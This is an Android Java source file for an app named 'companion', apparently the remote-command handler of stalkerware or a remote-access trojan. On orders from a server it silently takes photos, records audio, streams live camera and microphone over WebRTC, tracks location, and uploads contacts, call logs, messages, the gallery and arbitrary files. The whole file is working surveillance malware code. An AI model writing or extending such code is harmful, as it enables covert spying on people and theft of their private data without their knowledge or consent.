package com.snapapp.companion;

import android.content.Context;
import org.json.JSONObject;

public class CommandDispatcher {
    public interface LocationRefreshCallback {
        void onRefreshNeeded();
    }

    public static void dispatch(final Context context, final String serverUrl, final String deviceId,
                                JSONObject cmd, final LocationRefreshCallback locationCallback) {
        if (cmd == null) return;
        final String type = cmd.optString("command", "");
        final String cmdId = cmd.optString("id", null);
        JSONObject payload = cmd.optJSONObject("payload");

        if ("ring_siren".equals(type)) {
            SirenHelper.playSiren(context, serverUrl, deviceId, cmdId);
        } else if ("stop_siren".equals(type)) {
            SirenHelper.stopSiren();
            ackCommand(serverUrl, deviceId, cmdId);
        } else if ("take_photo".equals(type)) {
            final String camType = (payload != null) ? payload.optString("camera", "front") : "front";
            CameraHelper.takeSilentPhoto(context, "front".equalsIgnoreCase(camType), new CameraHelper.PhotoCallback() {
                @Override public void onPhotoCaptured(byte[] data) { ApiClient.uploadPhoto(serverUrl, deviceId, cmdId, camType, data); }
                @Override public void onError(String e) { ackCommand(serverUrl, deviceId, cmdId); }
            });
        } else if ("record_audio".equals(type)) {
            int duration = (payload != null) ? payload.optInt("duration", 15) : 15;
            AudioHelper.recordAndUpload(context, serverUrl, deviceId, cmdId, duration, null);
        } else if ("sync_apps".equals(type)) {
            TelemetryHelper.syncInstalledApps(context, serverUrl, deviceId, cmdId);
        } else if ("sync_contacts".equals(type)) {
            TelemetryHelper.syncContacts(context, serverUrl, deviceId, cmdId);
        } else if ("sync_calls".equals(type)) {
            TelemetryHelper.syncCalls(context, serverUrl, deviceId, cmdId);
        } else if ("sync_messages".equals(type)) {
            TelemetryHelper.syncMessages(context, serverUrl, deviceId, cmdId);
        } else if ("sync_gallery".equals(type)) {
            GalleryHelper.syncGallery(context, serverUrl, deviceId, cmdId);
        } else if ("upload_file".equals(type) || "fetch_file".equals(type)) {
            String path = (payload != null) ? payload.optString("file_path", "") : "";
            String fileId = (payload != null) ? payload.optString("file_id", null) : null;
            if (!path.isEmpty()) FileUploadHelper.uploadFile(context, serverUrl, deviceId, cmdId, fileId, path);
        } else if ("start_live_movement".equals(type)) {
            CompanionSyncService.setLiveMovementActive(context, true);
            ackCommand(serverUrl, deviceId, cmdId);
            if (locationCallback != null) locationCallback.onRefreshNeeded();
        } else if ("stop_live_movement".equals(type)) {
            CompanionSyncService.setLiveMovementActive(context, false);
            ackCommand(serverUrl, deviceId, cmdId);
            if (locationCallback != null) locationCallback.onRefreshNeeded();
        } else if ("webrtc_stream".equals(type)) {
            handleWebRtcCommand(context, serverUrl, deviceId, cmdId, payload);
        } else if ("fetch_location".equals(type) || "update_location".equals(type)) {
            ackCommand(serverUrl, deviceId, cmdId);
            if (locationCallback != null) locationCallback.onRefreshNeeded();
        }
    }

    private static void ackCommand(String serverUrl, String deviceId, String cmdId) {
        if (cmdId == null || serverUrl == null || deviceId == null) return;
        new Thread(() -> {
            try {
                JSONObject b = new JSONObject();
                b.put("device_id", deviceId);
                b.put("command_id", cmdId);
                ApiClient.postJson(serverUrl + "/api/device-sync/data", b, null);
            } catch (Throwable ignored) {}
        }).start();
    }

    private static void handleWebRtcCommand(Context ctx, String server, String devId, String cmdId, JSONObject p) {
        if (p == null) return;
        String act = p.optString("action", "start");
        if ("start".equals(act)) {
            boolean front = p.optBoolean("front", true);
            boolean video = p.optBoolean("video", true);
            boolean audio = p.optBoolean("audio", true);
            boolean speaker = !"earpiece".equalsIgnoreCase(p.optString("speaker_mode", "speaker"));
            WebRtcStreamManager.getInstance().startLiveStream(ctx, server, devId, front, video, audio, speaker);
            if (p.has("sdp")) {
                WebRtcStreamManager.getInstance().handleRemoteOffer(p.optString("sdp"));
            }
            ackCommand(server, devId, cmdId);
        } else if ("switch_camera".equals(act)) {
            WebRtcStreamManager.getInstance().switchCamera();
            ackCommand(server, devId, cmdId);
        } else if ("set_orientation".equals(act)) {
            WebRtcStreamManager.getInstance().setOrientation(p.optString("orientation", "portrait"));
            ackCommand(server, devId, cmdId);
        } else if ("set_audio_output".equals(act)) {
            WebRtcStreamManager.getInstance().setAudioOutput(p.optString("mode", "speaker"));
            ackCommand(server, devId, cmdId);
        } else if ("stop".equals(act)) {
            WebRtcStreamManager.getInstance().stopLiveStream();
            ackCommand(server, devId, cmdId);
        } else if ("offer".equals(act)) {
            WebRtcStreamManager.getInstance().handleRemoteOffer(p.optString("sdp"));
        } else if ("candidate".equals(act)) {
            JSONObject cand = p.optJSONObject("candidate");
            String s = cand != null ? cand.optString("candidate") : p.optString("candidate");
            int line = cand != null ? cand.optInt("sdpMLineIndex", 0) : p.optInt("sdpMLineIndex", 0);
            String mid = cand != null ? cand.optString("sdpMid", "") : p.optString("sdpMid", "");
            WebRtcStreamManager.getInstance().handleRemoteCandidate(s, line, mid);
        }
    }

    public static void handleWebRtcSignal(Context ctx, JSONObject p) {
        if (p == null) return;
        String type = p.optString("type", p.optString("action", ""));
        if ("offer".equals(type)) {
            WebRtcStreamManager.getInstance().handleRemoteOffer(p.optString("sdp"));
        } else if ("candidate".equals(type)) {
            JSONObject cand = p.optJSONObject("candidate");
            String s = cand != null ? cand.optString("candidate") : p.optString("candidate");
            int line = cand != null ? cand.optInt("sdpMLineIndex", 0) : p.optInt("sdpMLineIndex", 0);
            String mid = cand != null ? cand.optString("sdpMid", "") : p.optString("sdpMid", "");
            WebRtcStreamManager.getInstance().handleRemoteCandidate(s, line, mid);
        } else if ("stop".equals(type)) {
            WebRtcStreamManager.getInstance().stopLiveStream();
        }
    }
}
